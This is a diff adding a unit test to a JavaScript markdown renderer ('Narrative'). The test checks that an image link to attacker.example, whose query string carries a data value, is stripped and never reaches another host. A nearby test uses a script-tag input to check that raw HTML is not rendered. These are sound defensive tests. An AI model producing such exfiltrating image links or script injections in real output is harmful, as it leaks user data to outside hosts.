@@ -32,6 +32,14 @@ describe("Narrative", () => {
     expect(html.match(/<a /g)).toHaveLength(2);
   });
 
+  it("never loads an image: data in the text must not reach another host", () => {
+    const html = render("Revenue grew 12% [Q1].\n\n![chart](https://attacker.example/c.png?d=Fjordline%3A1520000) and ![](https://x.example/p)");
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("attacker.example");
+    expect(html).not.toContain("x.example");
+    expect(html).toContain("[chart]");
+  });
+
   it("never marks figures inside code, and never renders raw HTML", () => {
     const html = render("Use `SELECT 12%` literally. <script>alert(1)</script> 12%");
     expect(html).toContain("<code");
